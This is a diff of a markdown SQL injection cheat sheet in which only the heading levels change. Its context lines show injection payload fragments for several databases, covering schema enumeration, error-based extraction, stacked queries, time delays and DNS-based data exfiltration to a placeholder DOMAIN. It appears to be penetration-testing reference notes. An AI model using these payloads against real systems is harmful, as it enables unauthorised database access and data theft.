@@ -20,7 +20,7 @@ tags:
 
 ## SQLI CheetSheet
 
-#### Concatenar querys
+### Concatenar querys
 
 1. Oracle, PostgreSQL
 
@@ -41,7 +41,7 @@ tags:
 concat('foo','bar')
 ```
 
-#### Substring
+### Substring
 
 1. Oracle
 
@@ -55,7 +55,7 @@ substr('foobar',1,1)
 substring('foobar',1,1)
 ```
 
-#### Comments
+### Comments
 
 1. Oracle
 
@@ -85,7 +85,7 @@ substring('foobar',1,1)
 /*comment*/
 ```
 
-#### Database version
+### Database version
 
 1. Oracle
 
@@ -106,7 +106,7 @@ select @@version
 select version()
 ```
 
-#### Database contents
+### Database contents
 
 1. Oracle 
 
@@ -123,7 +123,7 @@ select table_name from information_schema.tables where table_schema='database'
 select column_name from information_schema.columns
 ```
 
-#### Conditional errors
+### Conditional errors
 
 1. Oracle
 
@@ -149,7 +149,7 @@ select case when('CONDITION') then 1/0 else NULL end
 select if('CONDITION',(select table_name from information_schema.tables),'a')
 ```
 
-#### Extracting data via visible error messages
+### Extracting data via visible error messages
 
 1. Microsoft
 
@@ -172,7 +172,7 @@ select 'foo' where 1=1 and extractvalue(1,concat(0x5c,(select 'test')))
 > XPATH syntax error: '\test'
 ```
 
-#### Batched (or stacked) queries
+### Batched (or stacked) queries
 
 1. Microsoft
 
@@ -187,7 +187,7 @@ select 'query1' select 'query2'
 select 'query1'; select 'query2'
 ```
 
-#### Time delays
+### Time delays
 
 1. Oracle
 
@@ -213,7 +213,7 @@ pg_sleep(10)
 sleep(10)
 ```
 
-#### Conditional time delays
+### Conditional time delays
 
 1. Oracle
 
@@ -239,7 +239,7 @@ select case when('CONDITION') then pg_sleep(10) else pg_sleep(0) end
 select if('CONDITION',sleep(10),'a') 
 ```
 
-#### DNS lookup
+### DNS lookup
 
 1. Oracle
 
@@ -270,7 +270,7 @@ load_file('\\\\DOMAIN\\a')
 select ... into OUTFILE '\\\\DOMAIN\a'
 ```
 
-#### DNS lookup with data exfiltration
+### DNS lookup with data exfiltration
 
 1. Oracle
 
@@ -305,7 +305,7 @@ SELECT f();
 select 'test' into OUTFILE '\\\\DOMAIN\a'
 ```
 
-#### Special Functions
+### Special Functions
 
 1. Insert Files
 
